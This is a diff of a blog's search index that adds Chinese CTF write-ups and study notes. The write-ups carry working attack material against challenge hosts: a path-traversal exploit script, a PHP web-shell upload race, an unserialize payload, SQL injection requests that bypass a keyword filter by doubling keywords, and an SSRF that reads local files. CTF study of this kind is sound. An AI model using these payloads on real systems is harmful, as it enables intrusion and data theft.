@@ -1,14 +1,58 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[python中的编码问题]]></title>
+    <url>%2F2019%2F08%2F18%2Fpython%E4%B8%AD%E7%9A%84%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98%2F</url>
+    <content type="text"><![CDATA[似乎好久之前就对这个有疑问了，还是沉下心来好好理解一下 python3中的字符串都是Unicode编码的，我们知道编码是有很多种方式的，最常见的有utf-8,gbk,ascii编码 好我们先来看： 12a = 'example' ---&gt; a 是 str类型b = a.encode('utf-8') ---&gt; 编码为字符 此时b的值为： b'example' 那这就很奇怪了，明明字母e德utf-8编码是0x65,为什么这里还是原来的？？ 不妨看这个： 我们看到python默认会将这个解释成对应的字符，那这就很没办法了 但是请看这个： 当我们去取出b中的一个元素时，这时候又转成了字母e的utf-8编码，只能说python在这一点上确实做的我无法理解 ok到这里大概疑惑就没了，用什么格式编码得到的byte，就需要用对应的格式解码回去 可以看出不同的编码得到的byte是不一样的，并且python默认会将可打印的字符直接打印出来？ 问题 十六进制 12345a = 'example'b = b'example'res = ''for i in b: res += str(hex(i))[2:] 此时res的值为：6578616d706c65 如果要将其变回原来的字符串怎么办 也就是一种ASCII hex编码 bytes.fromhex(res)这样就行了]]></content>
+      <categories>
+        <category>note</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>str</tag>
+        <tag>byte</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[网络安全专项赛]]></title>
+    <url>%2F2019%2F08%2F17%2F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A1%B9%E8%B5%9B%2F</url>
+    <content type="text"><![CDATA[跟队友打了一下这个比赛，小白学习了很多知识 show_me_your_image 这道题目很晕，上传文件之后可以查看，URL中的name似乎可以进行任意文件读取，但是base64解码之后得到的结果却是乱码，同时session可以用之前flask解码的脚本解码，但是这明明是php？？？(后来才知道是伪装成了php的flask) 首先还是需要学习一下python中的requests包，如何使用requests包上传文件 requests上传文件的简要代码如下： 1234567891011# coding=utf-8import requestsurl = "http://localhost:6789/upload"file = open("1.jpg", 'rb')files = &#123;'file': ('new_name.jpg', file, 'image/pjpeg')&#125;response = requests.post(url, files=files)file.close()print response.status_codeprint response.request.headersprint response.request.body files中包含了file对应的文件名，文件内容，和类型，有这三者就够了 参考师傅们的exp 123456789101112131415161718192021222324252627282930313233343536373839404142import urllibimport base64import requestsfrom bs4 import BeautifulSoupdef base_encode(target, filename): if len(filename) != 3: return None r = requests.post(target+"upload.php", files=&#123;'file': (filename + '.jpg', 'z3r0test', 'text/plain')&#125; ) # print(r.text) soup = BeautifulSoup(r.text, "html.parser") pic_url = soup.find('img') # print(pic_url['src'].replace('img.php?name=', '')) filename = pic_url['src'].replace('img.php?name=', '') # print(filename) urldecode = urllib.parse.unquote(filename) return urldecode[:4]def read(target, filename): filename = urllib.parse.unquote(filename) r = requests.get(target+"img.php", params=&#123;'name': filename&#125;) print(r.text)if __name__ == "__main__": target = "http://fc663c386ea14c96ba9808b72602d341fda4447a2bfb4e01.changame.ichunqiu.com/" payload = "../.././proc/self/root/root/flag.txt" # payload = "../..//proc/self/cwd/app.py" if len(payload) % 3 != 0: print("must be three times!") exit() final = "" for i in range(0, len(payload), 3): final += base_encode(target, payload[i:i + 3]) final = urllib.parse.quote(final) read(target, final) 两个trick： fuzz出文件名的编码关系，这里是三个变四个 /proc/self/cwd/ 指向的是当前路径，在本题中用于拼凑3倍数长度的字符串 其实我们只需要上传文件名然后获得对应的编码就行r = requests.post(target+&quot;upload.php&quot;,files={'file': (filename + '.jpg', 'z3r0test', 'text/plain')}) 之后调用BeautifulSoup去解析就行了 参考 使用requests 上传文件]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[上传竞争]]></title>
+    <url>%2F2019%2F08%2F17%2F%E4%B8%8A%E4%BC%A0%E7%AB%9E%E4%BA%89%2F</url>
+    <content type="text"><![CDATA[文件上传的题目遇到的不是很多，这里分析一下文件上传竞争 上传竞争的来源： 栗子：先存储文件，再判断是否合法，然后再删除。 首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室” 攻击：首先上传一个php文件 当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。 这里有一道对于文件上传竞争的wp： 2018护网杯第一场 web easy tornado LTshop超详细解答 同时我们来看一下moctf的一道题: http://119.23.73.3:5006/web2/index2.php 直接访问index2.php肯定不正常，抓包修改成index.php，提示uploadsomething.php 访问之后是一个文件上传页面。自定义文件名和文件内容 文件名可以是php后缀的，那思路就是写一个shell进去再访问，但是访问时候页面提示太慢了。 所以题目可能是检测到了php代码将其删除了，于是考虑文件上传竞争 抓两个包，一个是文件上传的 /web2/uploadsomething.php?filename=1.php&amp;content=%3C%3Fphp%2Bsystem%28%E2%80%9Cls%E2%80%9D%29%3B%3F%3E 另一个是访问的 /web2/uploads/56db0b8d99fd6116ed67d35b607cd9351ea94156/1.php 都发送到intruder模块，设置线程为50，字典为空 先爆破第一个： 然后爆破第二个： 就会有flag了 参考 CTF中的条件竞争漏洞]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[复习git]]></title>
     <url>%2F2019%2F08%2F16%2F%E5%A4%8D%E4%B9%A0git%2F</url>
     <content type="text"><![CDATA[最近发现自己还不是很懂git，于是好好学习一下 git标签管理 git有一个打标签的功能，这个功能可以理解成虚拟机的快照， Git的标签虽然是版本库的快照，但其实它就是指向某个commit的指针（跟分支很像对不对？但是分支可以移动，标签不能移动），所以，创建和删除标签都是瞬间完成的。 ---摘自廖雪峰 命令git tag &lt;tagname&gt;用于新建一个标签，默认为HEAD，也可以指定一个commit id； 命令git tag -a &lt;tagname&gt; -m &quot;blablabla...&quot;可以指定标签信息； 命令git tag可以查看所有标签。 命令git push origin &lt;tagname&gt;可以推送一个本地标签； 命令git push origin --tags可以推送全部未推送过的本地标签； 命令git tag -d &lt;tagname&gt;可以删除一个本地标签； 命令git push origin :refs/tags/&lt;tagname&gt;可以删除一个远程标签。 GitHack的原理 如果将.git文件夹部署到线上环境，将引起git源码泄露 工作原理： 1、解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 ) 2、去.git/objects/ 文件夹下下载对应的文件 3、zlib解压文件，按原始的目录结构写入源代码 git的原理 git cat-file 命令 参考 GitHack：一个git泄露利用脚本 git内部原理 XDCTF2015代码审计全解]]></content>
+      <categories>
+        <category>note</category>
+      </categories>
+      <tags>
+        <tag>git</tag>
+      </tags>
   </entry>
   <entry>
     <title><![CDATA[JarvisOJ]]></title>
     <url>%2F2019%2F08%2F16%2FJarvisOJ%2F</url>
     <content type="text"><![CDATA[神盾局的秘密 查看页面源码，猜测是本地文件包含 先查看showimg.php 123456789101112&lt;?php $f = $_GET['img']; if (!empty($f)) &#123; $f = base64_decode($f); if (stripos($f,'..')===FALSE &amp;&amp; stripos($f,'/')===FALSE &amp;&amp; stripos($f,'\\')===FALSE &amp;&amp; stripos($f,'pctf')===FALSE) &#123; readfile($f); &#125; else &#123; echo "File not found!"; &#125; &#125;?&gt; 然后查看index.php 123456789&lt;?php require_once('shield.php'); $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt; 再查看shield.php 12345678910111213141516&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; 尝试直接查看pctf.php没有成功 123456class Shield&#123; public $file='pctf.php';&#125;$a= new Shield();echo serialize($a); IN a mess 源代码提示访问 index.phps 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);echo "&lt;!--index.phps--&gt;";if(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; 这个审计题目是见过的 精心构造的payload 用0a绕过弱类型，用伪协议绕过文件读取，用%001111绕过substr和strlen 之后来到第二关： 发现是注入 过滤了空格和一些关键字符，可以使用双写绕过 之后尝试爆字段 字段数为3 GET /%5eHT2mCpcvOLf/index.php?id=-1/*1222*/uniunionon/*123*/selselectect/*123*/1,2,3%23 HTTP/1.1 数据库名： 其实表是已经知道了，就是content，不过还是再手动爆一下： 这里必须使用十六进制编码，不然得不到 爆字段 GET /%5eHT2mCpcvOLf/index.php?id=-1/*1222*/uniunionon/*123*/selselectect/*123*/1,2,group_concat(column_name)/*123*/frfromom/*123*/information_schema.columns/*123*/where/*123*/table_schema=0x74657374%23 HTTP/1.1 获取数据 GET /%5eHT2mCpcvOLf/index.php?id=-1/*1222*/uniunionon/*123*/selselectect/*123*/1,2,group_concat(id,context,title)/*123*/frfromom/*123*/content HTTP/1.1 chopper 这题重新复现一下一叶飘零师傅的思路，同时好好理解一下什么是ssrf 查看源码发现一个很有意思的点： 12345678910111213141516&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html;charset=UTF-8"&gt; &lt;title&gt;ISCC 2016&lt;/title&gt; &lt;div class="container"&gt; &lt;img src="proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg" alt=""&gt; &lt;p&gt;&lt;a href="admin"&gt;管理员登录&lt;/a&gt;&lt;/p&gt; &lt;/div&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt; 那个图片是通过一个url加载出来的，于是我就尝试用自己blog上的图片 果真如此： 于是这就是一典型的SSRF了 直接尝试读取文件 读取失败，尝试绕过 直接大写一个字母就行 于是可以读取任意文件 如果url不加参数 于是我们就知道了文件的位置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?php/*P_PROXY v0.2@author:haozigege@time:2016/3/19@windows extension=php_curl.dll(php.ini)@linux cd ext/curl;phpize ./configure –with-curl;make;@info url全部通过GET来传递,如果使用POST，则读取POST数据发送请求,可以给中国菜刀提供接口;cookie和其他http头部信息可以直接从请求中读取。@update 修改了host不一致的问题,去除了method参数简化了逻辑结构。*/function get_result($curlobj)&#123; $result=curl_exec($curlobj); $headerSize=curl_getinfo($curlobj,CURLINFO_HEADER_SIZE); $res_header=substr($result, 0, $headerSize); $result =substr($result,$headerSize); curl_close($curlobj); set_response_header($res_header); echo $result;&#125;function getmyheader($curlobj,$headerlines)&#123; $res_headers=$headerlines; return $res_headers;&#125;function set_response_header($headers)&#123; $headarr=explode("\r\n",$headers); foreach($headarr as $key=&gt;$value)&#123; header($value); &#125;&#125;function init_curl($link,$headers)&#123; $curlobj = curl_init(); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);//raw output curl_setopt($curlobj, CURLOPT_HTTPHEADER, $headers); curl_setopt($curlobj, CURLOPT_HEADER, 1); return $curlobj;&#125;foreach(getallheaders() as $key=&gt;$value)&#123; if ($key=='Content-Length' and isset($_POST))&#123; $post=http_build_query($_POST); $value=strlen($post); &#125; $headers[]=$key.':'.$value;&#125;if(isset($_REQUEST['url']))&#123; $link=$_REQUEST['url']; $url=explode('/',$link)[2]; /* curl setting */ $curlobj = init_curl($link,$headers); //GET if ($_SERVER['REQUEST_METHOD']=='GET')&#123; //READ FILE if(substr($link, 0,7)=='file://')&#123; echo substr($link,7); $result=""; //$result=file_get_contents(substr($link,7)); echo $result; curl_close($curlobj); &#125;else&#123; curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj, CURLOPT_HTTPHEADER, ["HOST",$url]); get_result($curlobj); &#125; &#125;else &#123; //POST curl_setopt($curlobj, CURLOPT_POST, 1); curl_setopt($curlobj, CURLOPT_POSTFIELDS,$post); curl_setopt($curlobj, CURLOPT_HTTPHEADER, ["HOST",$url]); get_result($curlobj); &#125;&#125;else&#123; echo 'invalid request';&#125;?&gt; 可以看出对协议的过滤很垃圾，就是看是不是file://开头的 尝试读取index.php和index.html，index.php没有，index.html就是原来的页面 这时候去admin目录下探测： 尝试探测w文件： view-source:http://web.jarvisoj.com:32782/proxy.php?url=File:///opt/lampp/htdocs/admin/robots.txt 就发现robots.txt 于是读]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
   </entry>
   <entry>
     <title><![CDATA[记录php代码审计]]></title>
@@ -162,8 +206,8 @@
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>wp</tag>
         <tag>web</tag>
+        <tag>wp</tag>
         <tag>实验吧</tag>
       </tags>
   </entry>
@@ -187,8 +231,8 @@
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>hash</tag>
         <tag>De1ctf</tag>
+        <tag>hash</tag>
       </tags>
   </entry>
   <entry>
@@ -211,8 +255,8 @@
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>php</tag>
         <tag>web</tag>
+        <tag>php</tag>
         <tag>thinkphp</tag>
       </tags>
   </entry>
